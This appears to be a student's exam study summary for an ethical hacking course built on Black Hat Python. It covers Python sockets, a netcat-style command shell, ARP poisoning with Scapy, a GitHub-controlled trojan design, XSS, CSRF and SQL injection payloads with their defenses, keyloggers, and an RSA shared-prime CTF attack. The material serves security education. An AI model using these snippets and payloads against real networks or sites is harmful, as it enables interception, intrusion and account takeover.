# Summary Ethical Hacking TTM4536
** REKLAME **

Fikk du et lite stikk i hjertet når du hørte hvordan grisene egentlig har det? Får du litt vondt inni deg når du vet at 
dyrene du spiser til middag aldri har sett dagens lys? Send UT AV MØRKET til 2474 og bidra med litt lommerusk (85kr)!
https://www.dyrevern.no/ut-av-morket

==========================================================


This summary is written in relation to the exam in **TTM4536**. So I extracted the stuff the professor cares about the most + 
a bit DuckDuckGoing. 

The book: _Black Hat Python_ was published by Justin Seitz in 2014.
The book is about writing network sniffers, manipulating packets, infecting virtual machines, creating stealthy trojans, and more. 
Unfortunately, it is written in Python 2.7 (but I wrote a couple of them in py 3 without problem). 

#### Content
1. [ Chapter 1](#chap1)
2. [ Chapter 2: Network Basics](#chap2)
3. [ Chapter 3: The network](#chap3)
4. [ Chapter 4: Owning the network with Scapy](#chap4)
5. [ Chapter 5: Web hackery](#chap5)
6. [ Chapter 7: Github command and control](#chap7)
7. [ Web Security](#WebSec) \
    7.1 [ XSS ](#XSS) \
    7.2 [ CSRF ](#csrf) \
    7.3 [ SQL injection ](#SQL)
8. [ SpyWare ](#spyware) \
    8.1 [ Keyloggers ](#keyloggers)
9. [ Crypto ](#crypto)
10. [ MISC (other stuff we can be asked) ](#misc)
11. [ Summary of Python modules you should know ](#modules) 


<a name="chap1"></a>
## Chapter 1 
The book walks through setting up a VM for Kali Linux. Kali was designed by Offensive Security, and 
is based on Debian. It comes with a bunch of hacking-tools installed from before, e.g. Hydra (password cracking) and Metasploit (known exploits).

<a name="chap2"></a>
## Chapter 2: Network Basics
[Socket module](https://docs.python.org/3/library/socket.html) -  A socket is one endpoint of a two-way communication 
link between two programs running on the network. In python, we can use the socket module to create socket objects. When
the socket object is created, we must pass two constants: one representing the address family we wish to use (e.g. ipv4/ipv6),
and one representing the socket type (e.g. raw, udp, tcp).     

### TCP client
* import socket

Three steps:
* Create socket: client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
* Connect the client: client.connect(target_host, target_port)
* start sending and receiving 

<pre>
import socket

ipv4 = socket.AF_INET
TCP = socket.SOCK_STREAM
server_address = ('localhost', 1234)

client_socket = socket.socket(ipv4, TCP)
client_socket.connect(server_address)

try:
    message = "halloen!"
    client_socket.send(message.encode())
    response = client_socket.recv(1234)
    print("[+] response: " + str(response))
finally:
    client_socket.close()
    print("[+] closed connection ")
</pre>

Important parameters:
* AF_INET: we're using standard ipv4 address or a common hostname.
* SOC_STREAM: this will be a TCP client. 

### UDP client
* import socket

Similar to TCP client, but:
* UDP is connectionless so we don't connect the client. 
* SOC_DGRAM: says it will be a UDP client (instead of SOC_STREAM)

### TCP server
* Import socket and threading. The threading module will be used to handle more than 1 connection simultaneously. 
* Create socket
* server.bind(ip, port):  _bind()_ is used to associate the socket with the server address. 
* start to listen: _server.listen(n)_ n means that we have maximum n connections. 
<pre>
number_of_connections = 1
TCP = socket.SOCK_STREAM
ipv4 = socket.AF_INET

server_socket = socket.socket(ipv4, TCP)  

server_socket.bind(('localhost', 1234))
server_socket.listen(number_of_connections)
print("[+] Listening...")
</pre>
* Make a client handler function that can receive and respond to the client. The function should take 
a client socket as param:
<pre>
def handle_client(client_socket):
    request = client_socket.recv(1024).decode()
    print("[+] Received: " + str(request))
    client_socket.send("ACK".encode())
    client_socket.close()
</pre>
* Wait for incoming connections. When a client connects, we receive the client socket. Create
a threading object that points to the client handler function. Pass the client socket with it:
<pre>
while True:
    client, address = server_socket.accept()
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()
</pre>

### Replacing netcat
[netcat](https://en.wikipedia.org/wiki/Netcat) - used to read or write from network connections using
either UDP or TCP. 

[subprocess](https://docs.python.org/3/library/subprocess.html) - The subprocess module allows you to spawn new processes,
connect to their input/output/error pipes, and obtain their return codes. In this case, we use subprocess to execute bash commands
after the shell is obtained and obtain the output for these commands. 

Why replace netcat? We can imagine a scenario where you hacked into a network NETX, where netcat is **not** installed.
NETX has Python installed.
From NETX you want to hack into NETY. As you can't use netcat, we can write the same functionality in Python.
Another scenario where this can be useful is in situations where you need to add some extra/special functionality
to netcat. Then, writing your own can be useful. 

[replacing netcat with python](https://www.cybrary.it/0p3n/create-netcat-replacement-python-part-1/) - article
* import _sys, socket, threading_ and _subprocess_. For options I recommend optparse: from optparse import OptionParser.
    * sys will be used to capture raw user input. This is useful after the shell has been initiated and the user wants to run
    commands.
    * socket is used to create our sockets that essentially enable the communication between the two endpoints.
    * threading is used to let our server handle more than 1 client connection simultaneously. 
    * subprocess is used to spawn a new process that executes shell commands and capture its output.
* Specify options that the user can chose from; like target_host, target_port, command, command_shell. 
* Netcat python will have two main functionalities: listen (server) and not listen (client)
* After the server binds and the client connects, we can start with command_shell and commands.
* Use subprocess to execute commands, for instance "cat file.txt". This is done in the function run_command:
<pre>
def run_command(command):
    output = ""
    try:
        output = subprocess.run(command, check=True, shell=True, stdout=subprocess.PIPE)
        print("[+] Command output: " + str(output.stdout))
    except:
        print("[-] Failed to execute command :(")

    return (output.stdout).decode('utf-8')
</pre>

Try it out! (Press Ctrl + D before you execute commands.)

![Alt text](figures/pycat.png?raw=true)

### TCP Proxy
A proxy is an intermediate for requests between two communicating parts. To build a proxy server in Python:
* Import _sys, socket_ and _threading_:
    * The sys module is used here to access command-line arguments passed to the script;
    * socket is as usual used as the ending points for our communication - it enables sending and receiving of data;
    * threading is used to enable more than 1 connection at the time. 
* Implement a server loop that listens for connections. 
* When a new connection arrive, it is handed to the _proxy_handler_.
* The _proxy_handler_ can send and receive to either side of the connection. 
* _receive_from(socket obj)_ is used to receive from both ends of the communication. 
* _response_handler_ can be used to modify the response packets or whatever you want to do with the packets before we send it to the local client. 
* Similarly, the _request_handler_ is used to modify the request packets before its sent to the remote host.

### SSH client with paramiko
[Paramiko](https://www.paramiko.org/) - Paramiko is a python implementation of SSHv2. Building SSH clients and servers in 
Python can be useful because Windows doesn't have a SSH client. 
* Install paramiko with pip. 
* ssh_client = paramiko.SSHClient() - create a ssh client object. 
* _set_missing_host_key_policy(paramiko.AutoAddPolicy)_ - Set policy to use when connecting to servers without a known host key.
* _paramiko.AutoAddPolicy_ - Policy for automatically adding the hostname and new host key to the local HostKeys object, and saving it.
* _ssh_client.connect(ip, username=user, password=pwd)_ - connect the client to a SSH server (ip) and authenticate it with
username and password. Note that using keys instead of password authentication are more secure and recommended. 
* _ssh_client.get_transport().open_session()_ - _get_transport()_ returns the underlying Transport object for this SSH connection.
This is can be used to open a session. 
* _ssh_session.exec_command(command)_ - execute a command on the ssh server. 

<a name="chap3"></a>
## Chapter 3: The network
### Building a UDP host discovery tool 
[Socket module](https://docs.python.org/3/library/socket.html)

* Why UDP? Simple and no overhead. 
* Windows requires some extra flags through a Socket Input/Output Control (IOCTL). 
This enables network [Promiscuous mode](https://en.wikipedia.org/wiki/Promiscuous_mode) - that we receive all packets. 
* _socket.IPPROTO_IP_: Windows allow us to sniff all incoming packets.
* _socket.IPPROTO_ICMP_: Linux forces us to specify ICMP. 
* _socket.SOCK_RAW_: In the sniffer, we create a raw socket. 
* _raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)_: set parameters to include IP headers. 
* [netaddr](https://pypi.org/project/netaddr/) - to cover subnets. 

**Decoding IP Layer**
* Goal: decode from binary to human-readable.
* [ctypes](https://docs.python.org/3/library/ctypes.html) - we're using this module to create a C-like structure to map 
the first 20 bytes into a readable IP header. We can also use this module to create a C-like structure to decode ICMP responses.
For instance, the version field in our IP header: _("version", c_ubyte, 4)_ - c_ubyte means that it is an unsigned char in 
C, but a int/long in Python. 
* [struct](https://docs.python.org/3/library/struct.html) - this module performs conversions between Python values and 
C structs represented as Python bytes objects. In our discovery tool, we use it to pack the src and dst address, which are
the type native unsigned int (@ for native, I for unsigned int).  
<pre>
>>> socket.inet_ntoa(struct.pack("@I", 1111111))
'71.244.16.0'
</pre>

<a name="chap4"></a>
## Chapter 4: Owning the network with Scapy
> After the book was published, Scapy got more functionality - some of the functions in the book are now doing stuff
that Scapy already can. 

[Scapy](https://scapy.readthedocs.io/en/latest/) - Scapy is a powerful packet manipulation tool. 
It is a Python program that enables the user to send, sniff and dissect and forge network packets. 
This capability allows construction of tools that can probe, scan or attack networks. It can be used to build tools
replacing parts of (or fully) wireshark/tshark, nmap, tcpdump or arpspoof.  

Install: 
<pre> $ pip install scapy
</pre>

You can start a scapy interactive shell to try it out by typing _scapy_ in your terminal. 

To list available commands, use _lsc()_.

To list supported protocols, use _ls()_. 

To see the fields of a layer, use _ls(layer)_:

![Alt text](figures/ls.png?raw=true)

### Build a sniffer with scapy
* Import: _from scapy.all import *_
* _sniff(filter="", iface="any", prn=function, count=N)_ 
* _filter_ is for defining a BPF filter (like in Wireshark). If it is left blank, then we sniff all packets. 
Example: filter="tcp port 80 or tcp port 443". 
* _iface_ is for specifying network interface. Example: iface="en0"
* _prn_ is is used to specify a callback function for that is called every time a packet matches the filter. As a simple example,
you can just print the captured packet in the callback function: 
<pre>
def packet_callback(packet):
    print(packet.show())
</pre>
* _count_ is used to specify how many packets scapy should sniff. 

### ARP poisoning with Scapy
The Address Resolution Protocol (ARP) is a widely used communications protocol for resolving Internet layer addresses into link layer addresses. 

[ARP  vulnerability](https://en.wikipedia.org/wiki/ARP_spoofing#ARP_vulnerabilities) - 
When an Internet Protocol (IP) datagram is sent from one host to another in a local area network,
the destination IP address must be resolved to a MAC address for transmission via the data link layer.
When another host's IP address is known, and its MAC address is needed, a broadcast packet is sent out on the local network.
This packet is known as an ARP request. The destination machine with the IP in the ARP request then responds with an ARP reply
that contains the MAC address for that IP.

[ARP poisoning](https://doubleoctopus.com/security-wiki/threats-and-tools/address-resolution-protocol-poisoning/) -
Address Resolution Protocol (ARP) poisoning is when an attacker sends falsified ARP messages over a local area network 
(LAN) to link an attacker’s MAC address with the IP address of a legitimate computer or server on the network. 
Once the attacker’s MAC address is linked to an authentic IP address, the attacker can receive any messages directed
to the legitimate MAC address. As a result, the attacker can intercept, modify or block communicates to the legitimate MAC address.

![Alt text](figures/arp.png?raw=true)

**ARP cache poisoning with Scapy**

[Article](https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe112)
* Requirement: LAN access
* Use _netstat -rn_ to find gateway ip and then _arp -a_ to find the associated ARP cache entry. 
* Step 1: Use _getmacbyip(ip)_ to find the MAC address of the target and the gateway ip.  
* Step 2: poison the target (and equivalent for the target gateway):
<pre>
def poison_the_target(gateway_ip, target_mac, source_ip):
	poison_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst= target_mac)
	send(poison_target, verbose=False)
</pre>
* Step 3: Restore the ARP tables of the machine.

### pcap and scapy 
[pcap](https://en.wikipedia.org/wiki/Pcap) - pcap is a an API for capturing network traffic. 
Unix-like systems implement pcap in the _libpcap_ library. For Windows, there is a port of libpcap named _Npcap_.

[Writeup HTB about scapy and pcap](https://kitctf.de/writeups/hitbctf/special_delivery)

* If you want a pcap file to test on, run:
<pre>
$ tshark  -T fields -e  data.data -e frame.time -w Eavesdrop_Data.pcap > Eavesdrop_Data.txt -F pcap -c 1000
</pre>
When you run this, it saves two files in the directory, a Pcap file and a text file after it captures 1000 packets. 
The output is a time stamp and whatever data is captured.
* _rdpcap(pcap_file)_: Read pcap file with scapy
* _wrpcap(pcap_file)_: Write to a pcap file with scapy
* Instead of following a stream in Wireshark, it is possible to do the same thing with Scapy:
<pre>
scapy_read_pcap = rdpcap(pcap_file)
sessions = scapy_read_pcap.sessions()
</pre>
* Then you can extract the info you want. E.g. if you want to extract all the cleartext traffic over TCP:
<pre>
for session in sessions:
    for packet in sessions[session]:
        if packet[TCP].sport == 80 or packet[TCP].dport == 80:
            print('[*] TCP \n' + bytes(packet[TCP].payload).decode('utf-8'))
</pre>
* You can extract info from other layers that Scapy support as well. It is possible to search for patterns with regular expressions (use the module _re_ in python)

<a name="chap5"></a>
## Chapter 5: Web hackery
### Web Security Dojo 
[Web Security Dojo](https://www.owasp.org/images/5/5c/Slides-WebSecurityDojo.pdf) - a self-contained environment for web 
security testing. Various security testing tools and vulnerable web applications added to a clean install of Ubuntu.
Tools + target = Dojo. 
**Download:** Download latest Dojo version, and import it in VirtualBox with File --> Import Appliance.    
**Configuring network adapter:** by default, the network adapter in virtual box is set to NAT. 
This default network mode is sufficient for users who wish to use a VM just for internet access, for example. If you want to
communicate between a kali VM and the Dojo VM, you need to change the network adapter to NAT network. This mode is similar to 
NAT, but the machines can now communicate with each other. The differences between those modes is shown in the figures below.
![Alt text](figures/NAT.png?raw=true)

![Alt text](figures/NATNetwork.png?raw=true)

However, if you don't want to use VMs, you can test scripts against e.g. http://testphp.vulnweb.com/. 
### Python and web 
>  Note that the book uses urllib2, but this one is not appreciated in python 3.
 The urllib2 module has been split across several modules in Python 3 named urllib.request and urllib.error. I'll stick to 
Python 3 as we will get full scores using this instead :) An even simpler python module in Pyhton 3 is 
[Requests](https://requests.readthedocs.io/en/master/) - "an elegant and simple HTTP library for Python, built for human beings."

#### Disguise browsing as Googlebot from Python
With urllib2:
<pre>
import urllib2

url = "https://vg.no"
headers['User-Agent'] = "Googlebot"

request = urllib2.Request(url, headers=headers)

response = urllib2.urlopen(request)
</pre>
With requests:
<pre>
import requests

url = "https://vg.no"
headers = {'user-agent': 'Googlebot'}

response = requests.get(url, headers=headers)
</pre>
 

<a name="chap7"></a>
## Chapter 7: Github command and control
Trojans - A Trojan malware is characterized by trying to be something that is not. For example, it can pretend to be an 
plugin to wordpress, but then hide a an executable with malicious behaviour in there. One of the most challenging aspects
of creating a solid Trojan framework is asynchronously controlling, updating and receiving data from deployed implants. 
It is important to have a relatively universal way to push code to Trojans. There are many ways to build a command and control, but
in this one git is used.

#### Git repo structure:
    .
    ├── config            # Unique config files for each Trojan: the Trojans perform different tasks.
    │   ├── trojanID.json    
    ├── modules           # Modular code that the Trojans pick up and executes.
    │   ├── dirlister.py
    │   ├── environment.py 
    └── data              # Data that the Trojans collect: data, keystrokes, screenshots etc.

#### Creating modules
Each module should expose a run function so that they can be loaded in the same way. 
Example of a simple module: _dirlister.py_:
<pre>
import os

def run(** args):
    files = os.listdir('.')
    
    return str(files)
</pre>
> The module lists the files in the current directory and return them as list of strings. You can make similar simple scripts
> like listing the environment variables (environment.py). 

#### Configuration
The config file is made so that each Trojan can perform certain actions over a period of time. We need to tell the Trojan
which actions to perform and which modules that are responsible for these actions. Each Trojan should have it's unique config
file, named trojanID.json. This is to sort the retrieved data, but also because each Trojan performs various tasks.
A simple Trojan config file can look like this:
<pre>
[
    {
     "module": "dirlister"
    },
     "module": "environment"
    }
]
</pre>
> This config file simply tells the remote Trojan which modules to run. You can also add execution duration, number
>of times to run the module, etc.

#### Building a Github Aware Trojan
* Do the necessary imports, define paths and TrojanID. 
* _connect_to_github():_ define this function to authenticate the user to the git repo. Retrieve and return the current repo and
branch. In real life this authentication process should be obfuscated. 
* _get_file_contents(filepath):_ this function is responsible for grabbing files from the repo and read them locally, including
the config file and the modules. 
*  _get_trojan_config()_: retrieve the remote config file so that the trojan knows which modules to run. 
* _store_module_results(data):_ this functions stores the retrieved data from the modules by pushing it to the git repo.

#### Hacking Python's import functionality 
(Why not just do this in the config files?)
We want to be able to pull external libraries, and the Trojan should make the the modules we pull in available to all other 
subsequent modules. For this, we can make a GitImporter class that will load necessary modules every time they are not available.
Python allows for this functionality by adding a custom class to sys.metha_path list.  

<a name="WebSec"></a>
## Web Security
#### OWASP
The OWASP foundation is a non-profit, open source organisation. Their goal is to make security visible so that every one
can take informed decisions. Everyone is welcome to contribute to their projects. 

[OWASP WebGoat](https://github.com/WebGoat/WebGoat) - a deliberately insecure web application maintained by OWASP 
designed to teach web application security lessons. [Solutions for the challenges](https://github.com/WebGoat/WebGoat/wiki/Main-Exploits) 

[OWASP Zed Attack Proxy (ZAP)](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) - one of the worlds most used security tools.
The tool helps you to automatically find security vulnerabilities in web applications. ZAP is known as a MITM-application:
Browser -> ZAP -> Web Application. Download and test it yourself, e.g. against http://testphp.vulnweb.com
![Alt text](figures/zap.png?raw=true)
> You can click on each of the alerts and read what ZAP did, how the attack works, and suggestions for fixes.

<a name="XSS"></a>
## Cross-site scripting (XSS)
XSS mostly happens on web pages. It is a type of attack where the hacker injects a malicious client-side script into the web 
page. The vulnerability exists because the user input is not exhaustively validated. The attack can be used to bypass access
controls. 

![Alt text](figures/cross-site-scripting-example.png?raw=true)

#### Stored (persistent) XSS attacks
Stored attacks are those where the injected script is permanently stored on the target servers,
such as in a database, in a message forum, visitor log, comment field, etc. 
The victim then retrieves the malicious script from the server when it requests the stored information.
_Example:_ an attacker might go to an online dating site might put something like this in their profile:
<pre>
"Hi! My name is Dave, I enjoy long walks on the beach and <script>malicious code here</script>"
</pre>
Any user that tries to access Dave’s profile will become a victim to Dave’s persistent cross-site scripting attack. 

#### Reflected XSS attacks 
In this type of XSS, the scripts are not stored. Instead, the injected script is reflected off the web server, such as in an error message, 
search result, or any other response that includes some or all of the input sent to the server as part of the request. 
Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website.
When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site,
the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. 
The browser then executes the code because it came from a "trusted" server. 
Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.
_Example:_ a user might receive a legitimate-looking email that claims to come from their bank. 
The email will ask them to take some action on the bank’s website, and provide a link. The link may end up looking something like this:
<pre>
http://legitamite-bank.com/index.php?user=&script>here is some bad code!</script>
</pre>

#### DOM-based XSS
[Owasp DOM-based XSS](https://www.owasp.org/index.php/DOM_Based_XSS)

_The Document Object Model (DOM)_ is a W3C (World Wide Web Consortium) standard. It is a platform independent 
interface that allows programs and scripts to dynamically access and modify the structure of an document. 
The document can be HTML, XHTML or XML.

In a DOM-based XSS attack, the attack payload is executed as a result of modifying the DOM environment in the victim's
browser. The page itself (the HTTP response) does not change, but the client side code contained in 
the page executes differently because of the malicious modifications that have occurred in the DOM environment. This
is different from the other XSS attacks, where the attack payload is placed in response page. 
  
![Alt text](figures/dom-xss.png?raw=true)

#### Preventive measures
XSS can be prevented by properly escaping/encoding output. Writing such encoders yourself is not super difficult, but there
are some pitfalls. Therefor, it is recommended to use libraries for this purpose. Many modern JS frameworks also have a 
builtin XSS protection, like Vue (2.0+), React and Angular (2.0+).  

[OWASP guide](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html):
* RULE #1 HTML escape before inserting untrusted data into HTML element content.
* RULE #2 Attribute escape before inserting untrusted data into HTML common attributes.
* RULE #3 JavaScript escape before inserting untrusted data into JavaScript data values.
* RULE #4 CSS escape and strictly validate before inserting untrusted data into HTML style property values.
* RULE #5 URL escape before inserting untrusted data into HTML URL parameter values.
* Rule #6 Sanitize HTML Markup with a library designed for the job.
* Rule #7 Avoid JavaScript URL's. 
* Rule #8 Prevent DOM based XSS. 

As you can see, there are many attack vectors for XSS, and preventing all of the XSS flaws is hard. In addition to these rules,
there are also some rules that can prevent the impact of a successful XSS attack. This includes
setting the HttpOnly cookie, implementing a content security policy and using the X-XXS-Protection header.   

<a name="csrf"></a>
## CSRF 
With this attack, a victim is forced to execute actions on behalf of an attacker. 

#### Example
Alice wishes to transfer 1000kr to Bob using the bank.com web application that is vulnerable to CSRF. 
Maria is an attacker that wants to trick Alice into sending the money to her instead. 

If the bank application primary used GET request for the transfers, the legit operation could look like this:
<pre>
GET http://bank.com/transfer.do?acct=BOB&amount=1000 HTTP/1.1
</pre>

Maria chose Alice as her victim to exploit the csrf vuln. So she edits the url so that she is the recipient of the money 
and of course increases the amount: 
<pre>
http://bank.com/transfer.do?acct=MARIA&amount=1000000
</pre>

Finally, Maria needs some social engineering skills to trick Alice into opening the link. So Maria can 
for instance send the link in an email or put the link on another page, embed it in a picture, embed in another link, etc. 

#### Mitigation
The primary recommended CSRF defense is [Token Based Mitigation](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html). 
The token should be:
* unique per user session;
* large random value;
* generated by a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG).

The CSRF token can be added through hidden fields, headers, and can be used with forms, and AJAX calls. 
Make sure that the token is not leaked in the server logs, or in the URL. 
The server must reject the requested action if the CSRF token fails validation.


<a name="sql"></a>
## SQL injection
SQL injection is a kind of injection attack where an attacker injects SQL queries through an input field in the client app.
It is one of the most common web-hacks.

[Interactive sql injection demo](https://free.codebashing.com/courses/php) 

**Example**

Consider an application that lets users log in with a username and password. If a user submits the username admin
and the password pwd123, the application checks the credentials by performing the following SQL query:
<pre>
SELECT * FROM users WHERE username = 'admin' AND password = 'pwd123'
</pre>
If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- 
to remove the password check from the WHERE clause of the query. For example, submitting the username admin'-- 
and a blank password results in the following query:
<pre>
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
</pre>
This query returns the user whose username is admin and successfully logs the attacker in as that user. 

Another classical example:
<pre>
SELECT * FROM Users WHERE UserId = 105 OR 1=1;
__Always true__
</pre>

**Tools:** 
We can use tools like [sqlmap](http://sqlmap.org/) to automate the detection and exploitation of sql injection flaws.

**Prevention (in preferred order):** 
1) Prepared Statements: Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. 
This coding style allows the database to distinguish between code and data, regardless of what user input is supplied.
Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker.
 In the safe example below, if an attacker were to enter the userID of tom' or '1'='1, 
 the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string tom' or '1'='1.
 <pre>
 // Example: safe C# prepared statements
 
 String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
try {
  OleDbCommand command = new OleDbCommand(query, connection);
  command.Parameters.Add(new OleDbParameter("customerName", CustomerName Name.Text));
  OleDbDataReader reader = command.ExecuteReader();
  // …
} catch (OleDbException se) {
  // error handling
}
 </pre>
2) Stored procedures: typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters.
 However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures.
  Stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks. 
3) Whitelisting: One traditional approach to preventing SQL injection attacks is to handle them as an input validation 
problem and either accept only characters from a whitelist of safe values. 
Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require
 less maintenance and can offer more guarantees with respect to security.
4) Blacklisting: Another traditional approach that tries to identify and escape a blacklist of potentially malicious values.
 As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can: 
    * Target fields that are not quoted
    * Find ways to bypass the need for certain escaped meta-characters 
    * Use stored procedures to hide the injected meta-characters 

<a name="spyware"></a>
## Spyware 
Spyware is software or hardware that aims at collection information about a user or organisation and send the information
back to another entity. It is often without the user's knowledge. 

### Types:
* Adware
* Tracking cookies
* Trojans
* System monitors
* Keyloggers
* Web beacons  
* Rootkits

#### Unwanted behaviour
Users frequently notice unwanted behavior and degradation of system performance. 
A spyware infestation can create **unwanted CPU activity**, **disk usage**, and **network traffic**. 
In can also rise stability issues, such as: **applications freezing**, **failure to boot**, and **system-wide crashes**.
Spyware that interferes with networking software can also cause difficulties connecting to the Internet. 

<a name="keyloggers"></a>
### Keylogger SW
Keyloggers is a type of spyware or monitoring software as it logs every keystroke you take. It is typically silent, 
so you don't know that your monitored. The malicious intent behind keyloggers can for example be to steal your credit card number
or account info. The figure below shows a keylogger SW that affected thousands of Wordpress sites. You can read the full article 
[here](https://www.bleepingcomputer.com/news/security/keylogger-found-on-nearly-5-500-infected-wordpress-sites/).

![Alt text](figures/WordPress-site-keylogger.png?raw=true)

Remote access SW keyloggers can upload locally captured data to a remote location. This can happen through:
* file uploading via FTP, a website or a database; 
* periodically emailing the data to specific address; 
* wireless transmission of data through an attached hardware system;
* software enabling remote login to the local machine.

#### Keylogger HW
Usually small devices that can be fixed to the keyboard, or placed within a cable or the computer itself. The keylogger HW
can be placed inside the keyboard, attached to the keyboard or be a replacement keyboard that already have the spyware installed.

#### Distribution
**HW:** The HW keyloggers require physical access to the device. An attacker can for example install a hw keylogger through a usb stick in the keyboard.

**SW:** SW keyloggers are distributed in a similar way as other malware. For example, an attacker can trick the user into downloading the keylogger.
The keylogger can be a file hidden in a package that otherwise looks normal. Other examples include distribution as an email attachment or
from a usb stick.  

#### Detection
Keyloggers are tricky to detect. Some signs that a keylogger is installed includes:
* performance slow down on web browsing;
* the mouse or keyboard pause, slow down or doesn't show up. 

The most straightforward way to detect keyloggers is by examining the background processes and google them:
<pre>
$ ps auxww
</pre>
Where:
* a lists all processes on a terminal, including those of other users. 
* x lists all processes without controlling terminals.
* u adds a column for the controlling user for each process. 

Other detection methods include e.g. check for file transmission to a weird addresses, 
check network logs etc. For the keylogger hardware, you can check for unwanted attached device. 

#### Countermeasures
* Don't be fooled into clicking on suspicious links. 
* Don't leave your computer unlocked. 
* Install an anti-keylogger. 
* Install anti-virus program. 
* Using a virtual keyboard. 
* Since most keyloggers want to steal your credit card/account etc. you can protect your accounts with a one-time password as
a part of the authentication process (for example: rsa code, physical key, code on phone). This prevents the _outcome_,
not the keylogger itself.  

#### Keyloggers mentioned in class
* keylogger.py (in blackboard): 
    * import sys, os, struct. 
    * Define a file to record the keystrokes. 
    * The keylogger registers keystroke **events**. The keylogger receives an event each time the user presses or releases a key. 
    Every OS has its specific structure to describe the events. So the keylogger implements logic on how to interpret it.
    * Define the keyboard layout, e.g. US, Norwegian etc. 
* LKL Linux Keylogger
* logkeys
* simple-key-logger
* PyKeylogger
* Hardware Keylogger Standalone Edition: a tiny hw device that can be attached between a keyboard and a computer. Keeps a 
record of all the keystrokes typed on the computer. It is totally transparent to the end-user. 
* Hardware Keylogger Keyboard Edition: is a keyboard that looks and behaves like a normal one. But it keeps a record of the
keystrokes typed on it. The strokes are kept in a non-volatile memory so the keyboard can be unplugged and the strokes retrieved
on another computer. 
* KeyGhost Hardware Keylogger: a tiny hw device that can be attached between a keyboard and a computer.
* KeyCatcher Keystroke logger: a tiny hw device that can be attached between a keyboard and a computer.

<a name="crypto"></a>
## Crypto
### RSA
RSA keygen (taken from [Thangavel et al.](https://www.sciencedirect.com/science/article/abs/pii/S2214212614001409))

![Alt text](figures/rsa-keygen.jpg?raw=true)

RSA key generation is based on the factorisation problem - which is a hard problem. If you are in doubt, try to calculate
? * ? = 281512008712700373730275954373439628511. 

#### Factorizing RSA? 
Although factorization is a hard problem, there's a different problem that's much easier: finding the gcd of two numbers.
If someone _reused_ the RSA keys, this could give a possibility to factorizing them. Consider that the prime b is reused in two keys.
Then there would be only three different primes: a, b, c, instead of four (a, b, c, d). 
So the public values are n1 = a * b and n2 = b * c. If we calculate gcd(n1, n2) we get b. 
The "good security"-case would have been gcd(ab, cd) = 1 - which reveals nothing. 
So now we can calculate a = n1/b and c = n2/b which is enough to retrieve both the private keys. 
(if you didn't understand it, read [this](http://www.loyalty.org/~schoen/rsa/)). 

#### CTF003 - Guinea
> Note: There exist a much easier tool for solving this CTF.

It is based on the vulnerability described above. We are given a bunch of .pem files, and two encrypted files. We want to
find the private keys to decrypt the files. So we basically go through all of the public keys from the .pem files and 
check if any two of them have a gcd greater than 1. If they do, we can use them to decrypt the encrypted files. 

The most important Python code to do this:
<pre>
for pemfile in pemfiles:
    public_key_from_pemfile = RSA.importKey(open(pemfile, "rb"))
    public_keys.append(public_key_from_pemfile)
</pre>
> Go through all the pem files and use RSA.importKey to import the public key from the pemfile. 
> The public keys can be stored in a list to iterate over later.

<pre>
for i in range (len(public_keys) - 1 ):
    for j in range (i+1, len(public_keys)):
        n1 = public_keys[i]
        n2 = public_keys[j]
        gcd_n1_n2 = Crypto.Util.number.GCD(n1, n2)
        
        if gcd_n1_n2 != 1 # We found right keys  
        ... 
</pre>

### Crypto in Python 
There are several subpackages in Python within the cryptographic area that are mentioned in class. 
Nice summary from the [API docs](https://pycryptodome.readthedocs.io/en/latest/src/api.html):

![Alt text](figures/Crypto.png?raw=true)

Some examples follow below: 

#### Encrypting and decrypting with AES
<pre>
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES

IV = get_random_bytes(16)
key = get_random_bytes(16)

def encrypt(text):
    AES_cipher = AES.new(key, AES.MODE_CBC, IV)
    ciphertext = AES_cipher.encrypt(text)
    return ciphertext

def decrypt(ciphertext):
    AES_cipher = AES.new(key, AES.MODE_CBC, IV)
    plaintext = AES_cipher.decrypt(ciphertext)
    return plaintext
</pre>

#### Generating public and private keys 
<pre>
from Crypto.PublicKey import RSA

key = RSA.generate(2048)

private_key = key.export_key()
public_key = key.public_key().export_key()
</pre>

<a name="misc"></a>
## MISC
** Other questions we might get ** 

### When setting up a virtual machine in VirtualBox, explain in brief as many system components as you can, that should be defined for the machine.
[Virtual box settings](https://www.nakivo.com/blog/virtualbox-network-setting-guide/) - a complete guide. 
* Operating system
* Size of base RAM memory
* CPUs
* Size of video memory
* Size of hard disk 
* Network adapter type
* Shared folders

### In order to speed up the hacking that a function “do_some_hack” is doing we want to run 10 instances of that function in parallel. How can we achieve that in Python?
We can use the Python module threading:
<pre>
import threading

def do_some_hack():
    print("hacking..")
    return 

for i in range(10): 
    t = threading.Thread(target=do_some_hack)
    t.start()
</pre>

### Is there other ways to speed up python?
[multiprocessing](https://docs.python.org/2/library/multiprocessing.html) - multiprocessing is a package that supports spawning processes using an API similar to the threading module.

With multiprocessing (same example as above):
<pre>
from multiprocessing import Process

def do_some_hack():
    print("hacking..")
    return 

